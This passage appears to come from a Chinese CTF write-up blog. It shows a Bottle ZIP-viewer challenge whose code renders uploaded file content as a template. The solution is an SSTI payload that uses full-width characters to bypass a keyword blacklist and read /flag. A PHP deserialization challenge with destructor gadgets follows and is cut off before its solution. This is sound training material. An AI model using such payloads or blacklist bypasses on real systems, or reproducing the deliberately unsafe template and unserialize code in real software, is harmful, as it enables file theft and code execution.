+</span></span><span class="line"><span class="cl">    <span class="n">unique_str</span> <span class="o">=</span> <span class="n">zip_file</span><span class="o">.</span><span class="n">filename</span> <span class="o">+</span> <span class="n">timestamp</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dir_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">unique_str</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">extract_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">dir_hash</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">zip_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">,</span> <span class="s1">&#39;uploaded.zip&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zip_file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">zip_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">safe_extract_zip</span><span class="p">(</span><span class="n">zip_path</span><span class="p">,</span> <span class="n">extract_dir</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">(</span><span class="n">zipfile</span><span class="o">.</span><span class="n">BadZipFile</span><span class="p">,</span> <span class="ne">ValueError</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shutil</span><span class="o">.</span><span class="n">rmtree</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s1">&#39;处理ZIP文件时出错: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="p">[</span><span class="n">f</span> <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">)</span> <span class="k">if</span> <span class="n">f</span> <span class="o">!=</span> <span class="s1">&#39;uploaded.zip&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;html lang=&#34;zh-CN&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;title&gt;上传成功&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;div class=&#34;header text-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;h1 class=&#34;display-4 fw-bold&#34;&gt;📦 ZIP文件查看器&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;p class=&#34;lead&#34;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;div class=&#34;container mt-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;div class=&#34;row justify-content-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;div class=&#34;col-md-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;div class=&#34;card&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;div class=&#34;card-header bg-success text-white&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;h4 class=&#34;mb-0&#34;&gt;✅ 上传成功!&lt;/h4&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;div class=&#34;card-body&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;div class=&#34;alert alert-success&#34; role=&#34;alert&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            ✅ 文件已成功上传并解压
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;h5&gt;文件列表:&lt;/h5&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;ul class=&#34;list-group mb-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            </span><span class="si">% f</span><span class="s1">or file in files:
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            &lt;li class=&#34;list-group-item d-flex justify-content-between align-items-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                &lt;span&gt;📄 {{file}}&lt;/span&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                &lt;a href=&#34;/view/{{dir_hash}}/{{file}}&#34; class=&#34;btn btn-sm btn-outline-primary&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                    查看
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                &lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            &lt;/li&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            </span><span class="si">% e</span><span class="s1">nd
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;/ul&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        </span><span class="si">% i</span><span class="s1">f files:
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;div class=&#34;d-grid gap-2&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            &lt;a href=&#34;/view/{{dir_hash}}/{{files[0]}}&#34; class=&#34;btn btn-primary&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                👀 查看第一个文件
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            &lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        </span><span class="si">% e</span><span class="s1">nd
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;div class=&#34;text-center mt-4&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;a href=&#34;/upload&#34; class=&#34;btn btn-outline-primary me-2&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        ➕ 上传另一个文件
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;a href=&#34;/&#34; class=&#34;btn btn-outline-secondary&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        🏠 返回首页
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    &lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;script src=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">dir_hash</span><span class="o">=</span><span class="n">dir_hash</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/view/&lt;dir_hash&gt;/&lt;filename:path&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view_file</span><span class="p">(</span><span class="n">dir_hash</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">dir_hash</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;文件不存在&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;请求的路径不是文件&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">real_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">real_path</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;非法访问尝试&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;latin-1&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;无法读取文件内容（可能是二进制文件）&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">contains_blacklist</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;文件内容包含不允许的关键词&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;渲染错误: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/static/&lt;filename:path&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">serve_static</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;静态文件服务&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">static_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">root</span><span class="o">=</span><span class="s1">&#39;static&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@error</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">error404</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;讨厌啦不是说好只看看不摸的吗&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@error</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">error500</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;不要透进来啊啊啊啊&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">#原神，启动!</span>
+</span></span><span class="line"><span class="cl">    <span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一开始以为软链接，后面一看，不就是打ssti嘛，直接打全角字符绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{ｏｐｅｎ(&#39;/flag&#39;).ｒｅａｄ()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="来签个到吧">来签个到吧
+</h2><p>题目</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileLogger</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$logfile</span> <span class="o">=</span> <span class="s2">&#34;/tmp/notehub.log&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$f</span><span class="o">=</span><span class="k">null</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logfile</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">write</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">.=</span> <span class="nv">$msg</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logfile</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">,</span> <span class="nx">FILE_APPEND</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logfile</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">,</span> <span class="nx">FILE_APPEND</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ShitMountant</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$url</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$logger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">url</span> <span class="o">=</span> <span class="nv">$url</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logger</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileLogger</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">fetch</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$c</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logger</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logger</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="s2">&#34;fetched ==&gt; &#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;./config.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;./classes.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_METHOD&#34;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;POST&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;shark&#34;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;喵喵喵?&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">str_starts_with</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="s2">&#34;blueshark:&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$ss</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="s2">&#34;blueshark:&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$o</span> <span class="o">=</span> <span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$ss</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$p</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;INSERT INTO notes (content) VALUES (?)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$p</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$ss</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;save sucess!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;喵喵喵?&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$q</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&#34;SELECT id, content FROM notes ORDER BY id DESC LIMIT 10&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rows</span> <span class="o">=</span> <span class="nv">$q</span><span class="o">-&gt;</span><span class="na">fetchAll</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>简单的反序列化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
